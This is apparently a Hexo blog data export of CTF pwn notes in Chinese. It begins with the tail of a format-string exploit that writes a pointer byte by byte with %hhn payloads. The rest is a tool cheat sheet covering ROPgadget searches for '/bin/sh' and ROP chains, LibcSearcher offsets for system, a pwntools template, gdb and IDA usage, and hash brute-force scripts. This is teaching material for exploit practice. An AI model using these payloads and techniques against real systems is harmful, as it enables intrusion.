class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(d).encode()+<span class="string">b&#x27;c%&#x27;</span>+<span class="built_in">str</span>(off1).encode()+<span class="string">b&#x27;$hhn&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;food: &#x27;</span>,payload)</span><br><span class="line">f=ptr&amp;<span class="number">0xff</span></span><br><span class="line">payload=<span class="string">b&#x27;%&#x27;</span>+<span class="built_in">str</span>(f).encode()+<span class="string">b&#x27;c%&#x27;</span>+<span class="built_in">str</span>(off2).encode()+<span class="string">b&#x27;$hhn&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;food: &#x27;</span>,payload)</span><br><span class="line">d+=<span class="number">1</span></span><br><span class="line">ptr&gt;&gt;=<span class="number">8</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWN从入门到出入平安（零）——工具篇</title>
      <link href="/PWN%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%87%BA%E5%85%A5%E5%B9%B3%E5%AE%89%EF%BC%88%E9%9B%B6%EF%BC%89%E2%80%94%E2%80%94%E5%B7%A5%E5%85%B7%E7%AF%87/"/>
      <url>/PWN%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%87%BA%E5%85%A5%E5%B9%B3%E5%AE%89%EF%BC%88%E9%9B%B6%EF%BC%89%E2%80%94%E2%80%94%E5%B7%A5%E5%85%B7%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<blockquote><p>有些人喜欢摸鱼，摸上瘾了，就什么都不记得了</p></blockquote><h4 id="连接-分析命令"><a href="#连接-分析命令" class="headerlink" title="连接&amp;分析命令"></a>连接&amp;分析命令</h4><p><code>nc</code> ：脑残的缩写</p><p><code>file</code> <code>checksec</code> ：检查文件</p><h4 id="ROP工具"><a href="#ROP工具" class="headerlink" title="ROP工具"></a>ROP工具</h4><h6 id="查找可存储寄存器的代码（rop表示二进制文件名）"><a href="#查找可存储寄存器的代码（rop表示二进制文件名）" class="headerlink" title="查找可存储寄存器的代码（rop表示二进制文件名）"></a>查找可存储寄存器的代码（rop表示二进制文件名）</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ROPgadget --binary rop --only <span class="string">&#x27;pop|ret&#x27;</span> | grep <span class="string">&#x27;eax&#x27;</span></span></span><br></pre></td></tr></table></figure><h6 id="查找字符串"><a href="#查找字符串" class="headerlink" title="查找字符串"></a>查找字符串</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ROPgadget --binary rop --string <span class="string">&quot;/bin/sh&quot;</span></span></span><br></pre></td></tr></table></figure><h6 id="查找有int-0x80的地址"><a href="#查找有int-0x80的地址" class="headerlink" title="查找有int 0x80的地址"></a>查找有int 0x80的地址</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ROPgadget --binary rop --only <span class="string">&#x27;int&#x27;</span></span></span><br></pre></td></tr></table></figure><h6 id="生成rop链"><a href="#生成rop链" class="headerlink" title="生成rop链"></a>生成rop链</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ROPgadget --binary rop --ropchain</span></span><br></pre></td></tr></table></figure><h6 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h6><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">usage: ROPgadget.py [-h] [-v] [-c] [--binary &lt;binary&gt;] [--opcode &lt;opcodes&gt;]</span><br><span class="line">                    [--string &lt;string&gt;] [--memstr &lt;string&gt;] [--depth &lt;nbyte&gt;]</span><br><span class="line">                    [--only &lt;key&gt;] [--filter &lt;key&gt;] [--range &lt;start-end&gt;]</span><br><span class="line">                    [--badbytes &lt;byte&gt;] [--rawArch &lt;arch&gt;] [--rawMode &lt;mode&gt;]</span><br><span class="line">                    [--rawEndian &lt;endian&gt;] [--re &lt;re&gt;] [--offset &lt;hexaddr&gt;]</span><br><span class="line">                    [--ropchain] [--thumb] [--console] [--norop] [--nojop]</span><br><span class="line">                    [--callPreceded] [--nosys] [--multibr] [--all] [--noinstr]</span><br><span class="line">                    [--dump]</span><br><span class="line"></span><br><span class="line">    -h, --help           显示帮助文档</span><br><span class="line">    -v, --version        版本号</span><br><span class="line">    -c, --checkUpdate    检测新版本是否可用</span><br><span class="line">    --binary &lt;binary&gt;    指定二进制文件进行分析</span><br><span class="line">    --opcode &lt;opcodes&gt;   在可执行段中查找opcode</span><br><span class="line">    --string &lt;string&gt;    在可读的段中查找字符串</span><br><span class="line">    --memstr &lt;string&gt;    查找单个byte在所有的可执行段中</span><br><span class="line">    --depth &lt;nbyte&gt;      搜索引擎的深度</span><br><span class="line">    --only &lt;key&gt;         只显示特别的指令</span><br><span class="line">    --filter &lt;key&gt;       过滤特定指令</span><br><span class="line">    --range &lt;start-end&gt;  在地址之间寻找(0x...-0x...)</span><br><span class="line">    --badbytes &lt;byte&gt;    拒绝特定指令在gadget的地址下</span><br><span class="line">    --rawArch &lt;arch&gt;     指定文件架构</span><br><span class="line">    --rawMode &lt;mode&gt;     指定源文件的mode</span><br><span class="line">    --rawEndian &lt;endian&gt; 指定源文件的endianness</span><br><span class="line">    --re &lt;re&gt;            正则表达式</span><br><span class="line">    --offset &lt;hexaddr&gt;   指定gadget的地址偏移</span><br><span class="line">    --ropchain           ROP chain的生成</span><br><span class="line">    --thumb              在ARM架构下使用搜索引擎thumb 模式</span><br><span class="line">    --console            使用交互终端对于搜索引擎</span><br><span class="line">    --norop              禁止ROP搜索引擎</span><br><span class="line">    --nojop              禁止JOP搜索引擎</span><br><span class="line">    --callPreceded       仅显示call-preceded的gadgets</span><br><span class="line">    --nosys              禁止SYS搜索引擎</span><br><span class="line">    --multibr            允许多分枝gadgets</span><br><span class="line">    --all                禁止删除重复的gadgets，即显示所有</span><br><span class="line">    --noinstr            禁止gadget指令终端打印</span><br><span class="line">    --dump               输出gadget bytes</span><br></pre></td></tr></table></figure><h4 id="One-gadget"><a href="#One-gadget" class="headerlink" title="One_gadget"></a>One_gadget</h4><h4 id="静态分析工具"><a href="#静态分析工具" class="headerlink" title="静态分析工具"></a>静态分析工具</h4><p><code>strace</code> : trace all system call</p><p><code>ltrace</code> : trace all library call</p><h4 id="lib查找工具"><a href="#lib查找工具" class="headerlink" title="lib查找工具"></a>lib查找工具</h4><h6 id="LibSearcher"><a href="#LibSearcher" class="headerlink" title="LibSearcher"></a>LibSearcher</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line"><span class="comment">#第二个参数，为已泄露的实际地址,或最后12位(比如：d90)，int类型</span></span><br><span class="line">obj = LibcSearcher(<span class="string">&quot;fgets&quot;</span>, <span class="number">0X7ff39014bd90</span>)</span><br><span class="line"> </span><br><span class="line">obj.dump(<span class="string">&quot;system&quot;</span>)        <span class="comment">#system 偏移</span></span><br><span class="line">obj.dump(<span class="string">&quot;str_bin_sh&quot;</span>)    <span class="comment">#/bin/sh 偏移</span></span><br><span class="line">obj.dump(<span class="string">&quot;__libc_start_main_ret&quot;</span>) </span><br><span class="line"> </span><br><span class="line"><span class="comment"># sys_addr = libc_base + obj.dump(&quot;system&quot;)</span></span><br></pre></td></tr></table></figure><h6 id="在线查找"><a href="#在线查找" class="headerlink" title="在线查找"></a>在线查找</h6><p><a href="https://libc.rip/">https://libc.rip/</a></p><h4 id="Payload编写"><a href="#Payload编写" class="headerlink" title="Payload编写"></a>Payload编写</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;snippet&gt;</span><br><span class="line">&lt;content&gt;&lt;![CDATA[</span><br><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>, terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;new-window&#x27;</span>])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">cmd=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">cmd += <span class="string">&quot;b main\n&quot;</span></span><br><span class="line">gdb.attach(p, cmd)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;&quot;</span></span><br><span class="line">port = <span class="number">0</span></span><br><span class="line">p = process(<span class="string">&quot;./&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(host, port)</span></span><br><span class="line"></span><br><span class="line">pt.interactive()</span><br><span class="line">]]&gt;&lt;/content&gt;</span><br><span class="line">&lt;!-- <span class="type">Optional</span>: <span class="type">Set</span> a tabTrigger to define how to trigger the snippet --&gt;</span><br><span class="line">&lt;tabTrigger&gt;pwn&lt;/tabTrigger&gt;</span><br><span class="line">&lt;!-- <span class="type">Optional</span>: <span class="type">Set</span> a scope to limit where the snippet will trigger --&gt;</span><br><span class="line">&lt;scope&gt;source.shell.bash&lt;/scope&gt; </span><br><span class="line">&lt;/snippet&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">send(payload) <span class="comment">#发送payload</span></span><br><span class="line">sendline(payload) <span class="comment">#发送payload，并进行换行（末尾\n）</span></span><br><span class="line">sendafter(some_string, payload) <span class="comment">#接收到 some_string 后, 发送你的 payload</span></span><br><span class="line">recvn(N) <span class="comment">#接受 N(数字) 字符</span></span><br><span class="line">recvline() <span class="comment">#接收一行输出</span></span><br><span class="line">recvlines(N) <span class="comment">#接收 N(数字) 行输出</span></span><br><span class="line">recvuntil(some_string) <span class="comment">#接收到 some_string 为止</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">base = <span class="built_in">int</span>(p.recvn(<span class="number">12</span>),<span class="number">16</span>) <span class="comment">#接受十六进制数</span></span><br><span class="line">p64()</span><br><span class="line">p32()</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;i386&quot;</span><span class="comment">#amd64</span></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level = <span class="string">&#x27;DEBUG&#x27;</span>)</span><br><span class="line">flat([<span class="number">0x114514</span>,<span class="number">0x191980</span>,...])</span><br><span class="line">p32(<span class="number">0x114514</span>)+p32(<span class="number">0x191980</span>)+...</span><br><span class="line"><span class="comment">#需设置好架构</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">elf = ELF(&#x27;./pwn&#x27;)</span><br><span class="line">libc = ELF(&#x27;./libc-2.27.so&#x27;)</span><br><span class="line"></span><br><span class="line">elf.symbols[&#x27;_start&#x27;]</span><br><span class="line">libc.symbols[&#x27;__libc_start_main&#x27;]5</span><br></pre></td></tr></table></figure><h4 id="Pwntools"><a href="#Pwntools" class="headerlink" title="Pwntools"></a>Pwntools</h4><p><code>cyclic 114</code>生成</p><p><code>cyclic -l laaa</code>检索(检索出数字为填到ret之前的数字)</p><h4 id="gdb使用"><a href="#gdb使用" class="headerlink" title="gdb使用"></a>gdb使用</h4><ul><li>启动：<code>start</code></li><li>断点：<ul><li><code>b *0x114514</code></li><li><code>b 符号名</code></li><li><code>d</code>删除，带数字第几个断点</li></ul></li><li>单步<ul><li>步入<code>si</code></li><li>步过<code>so</code></li><li>源码\汇编单步<code>n</code></li><li>直到下一个断点<code>c</code></li></ul></li><li>查看内存<ul><li><code>x/20gx 0x114514</code><ul><li>g：8byte，w：4byte，b：1byte</li><li>寄存器：<code>$esp</code></li></ul></li><li><code>hexdump 0x114514</code> 可查看内存及字符串</li><li><code>dsp</code> 自动解引用</li></ul></li><li>查看段的地址 范围<ul><li><code>vmmap</code></li></ul></li><li>查找地址<ul><li><code>printf system</code> 查找函数地址</li><li><code>find 0xf7df4d90,+2200000,&quot;/bin/sh&quot;</code> 起始地址+搜索长度+字符串</li></ul></li><li>info<ul><li><code>info breakpoint</code></li><li><code>info register</code></li></ul></li><li>elf</li><li>plt</li><li>fmtarg</li><li>arch使用pwndbgheap<ul><li><a href="https://gist.github.com/nbulischeck/bda4397a59b77822703f98f6aeb2cb20">https://gist.github.com/nbulischeck/bda4397a59b77822703f98f6aeb2cb20</a></li></ul></li><li>disassemble</li></ul><p>.gdbinit</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">source</span> /home/deepunk/Public/pwndbg/gdbinit.py</span><br><span class="line"><span class="built_in">source</span> /home/deepunk/Public/Pwngdb/pwngdb.py</span><br><span class="line"><span class="built_in">source</span> /home/deepunk/Public/Pwngdb/angelheap/gdbinit.py</span><br><span class="line"><span class="built_in">source</span> /home/deepunk/Public/splitmind/gdbinit.py</span><br><span class="line"></span><br><span class="line">define hook-run</span><br><span class="line">python</span><br><span class="line">import angelheap</span><br><span class="line">angelheap.init_angelheap()</span><br><span class="line">end</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> context-clear-screen on</span><br><span class="line"><span class="built_in">set</span> follow-fork-mode parent</span><br><span class="line"></span><br><span class="line">python</span><br><span class="line">import splitmind</span><br><span class="line">(splitmind.Mind()</span><br><span class="line">.tell_splitter(show_titles=False)</span><br><span class="line">.left(display=<span class="string">&quot;regs&quot;</span>, size=<span class="string">&quot;40%&quot;</span>)</span><br><span class="line">.below(display=<span class="string">&quot;disasm&quot;</span>, size=<span class="string">&quot;40%&quot;</span>)</span><br><span class="line">.above(of=<span class="string">&quot;main&quot;</span>, display=<span class="string">&quot;stack&quot;</span>, size=<span class="string">&quot;45%&quot;</span>)</span><br><span class="line">.right(display=<span class="string">&quot;backtrace&quot;</span>, size=<span class="string">&quot;25%&quot;</span>)</span><br><span class="line">.below(cmd=<span class="string">&quot;cmatrix&quot;</span>, size=<span class="string">&quot;40%&quot;</span>)</span><br><span class="line">.right(of=<span class="string">&quot;main&quot;</span>, cmd=<span class="string">&quot;ipython&quot;</span>, size=<span class="string">&quot;32%&quot;</span>)</span><br><span class="line">.show(<span class="string">&quot;legend&quot;</span>, on=<span class="string">&quot;stack&quot;</span>)</span><br><span class="line">).build(nobanner=True)</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> context-stack-lines 7</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="peda"><a href="#peda" class="headerlink" title="peda"></a>peda</h4><p><code>pattc xx</code></p><p><code>crashoff</code></p><h4 id="IDA使用"><a href="#IDA使用" class="headerlink" title="IDA使用"></a>IDA使用</h4><h6 id="快捷键："><a href="#快捷键：" class="headerlink" title="快捷键："></a>快捷键：</h6><p><code>U</code>：取消已有数据类型定义</p><p><code>D</code>：变数据，1(byte&#x2F;db),2(word&#x2F;dw),3(dword&#x2F;dd),4(qword&#x2F;dq)</p><p><code>C</code>：变指令</p><p><code>A</code>：ASCII码，该位置起点，\0结尾字符串</p><p><code>*</code>：数组</p><p><code>O</code>：地址偏移</p><p><code>Y</code>：改为正确类型</p><p><code>H</code>：16进制</p><p><code>M</code>：转为枚举中的值</p><p><code>_</code>：按补码解析为负数</p><p><code>~</code>：按位取反</p><h6 id="COLOR"><a href="#COLOR" class="headerlink" title="COLOR"></a>COLOR</h6><p>黑色：代码</p><p>灰色：数据</p><p>黄色：未定义</p><h4 id="patchelf-glibc-all-in-one"><a href="#patchelf-glibc-all-in-one" class="headerlink" title="patchelf&amp;glibc-all-in-one"></a>patchelf&amp;glibc-all-in-one</h4><h5 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install patchelf</span><br><span class="line">git clone https://github.com/matrix1001/glibc-all-in-one</span><br></pre></td></tr></table></figure><h5 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./update_list</span><br></pre></td></tr></table></figure><h5 id="下载库"><a href="#下载库" class="headerlink" title="下载库"></a>下载库</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat list</span><br><span class="line">./download xxx</span><br></pre></td></tr></table></figure><h5 id="查看libc同版本连接器"><a href="#查看libc同版本连接器" class="headerlink" title="查看libc同版本连接器"></a>查看libc同版本连接器</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings xxx.so | grep ubuntu</span><br></pre></td></tr></table></figure><h5 id="查看libc"><a href="#查看libc" class="headerlink" title="查看libc"></a>查看libc</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldd -v pwn</span><br></pre></td></tr></table></figure><h5 id="修改"><a href="#修改" class="headerlink" title="修改"></a>修改</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">patchelf --set-interpreter 你的文件目录/ld-linux-x86-64.so.2 ./pwn</span><br><span class="line">patchelf --add-needed 你的文件目录/libc.so.6 ./pwn</span><br></pre></td></tr></table></figure><h4 id="sha256爆破脚本"><a href="#sha256爆破脚本" class="headerlink" title="sha256爆破脚本"></a>sha256爆破脚本</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> digits, ascii_letters, punctuation</span><br><span class="line">alpha_bet=digits+ascii_letters+punctuation</span><br><span class="line">strlist = itertools.product(alpha_bet, repeat=<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">sha256=<span class="string">&quot;a645e3deef85766e43c8a1aa63d1f69eed55e7cb94f10973bd76a9ace57c7311&quot;</span></span><br><span class="line">tail=<span class="string">&quot;amLSvne0g1ypVG5J&quot;</span></span><br><span class="line"></span><br><span class="line">xxxx=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> strlist:</span><br><span class="line">    data=i[<span class="number">0</span>]+i[<span class="number">1</span>]+i[<span class="number">2</span>]+i[<span class="number">3</span>]</span><br><span class="line">    data_sha=hashlib.sha256((data+<span class="built_in">str</span>(tail,encoding=<span class="string">&#x27;utf-8&#x27;</span>)).encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line">    <span class="keyword">if</span>(data_sha==<span class="built_in">str</span>(sha256,encoding=<span class="string">&#x27;utf-8&#x27;</span>)):</span><br><span class="line">        xxxx=data</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(xxxx)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10000</span>,<span class="number">9999999999</span>):</span><br><span class="line">    res = hashlib.sha1(<span class="built_in">str</span>(num).encode()).hexdigest() <span class="comment">#sha1改为题目需要的算法</span></span><br><span class="line">    <span class="keyword">if</span> res[<span class="number">0</span>:<span class="number">5</span>] == <span class="string">&quot;903ed&quot;</span>:   <span class="comment">#对hash的前五位为&quot;903ed&quot;的数字进行碰撞</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(num)) <span class="comment">#等待执行结束 输出结果</span></span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h4 id="tricks"><a href="#tricks" class="headerlink" title="tricks"></a>tricks</h4><p>if .plt adress endup with null byte</p><p>adress+&#x3D;6(32bit)</p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
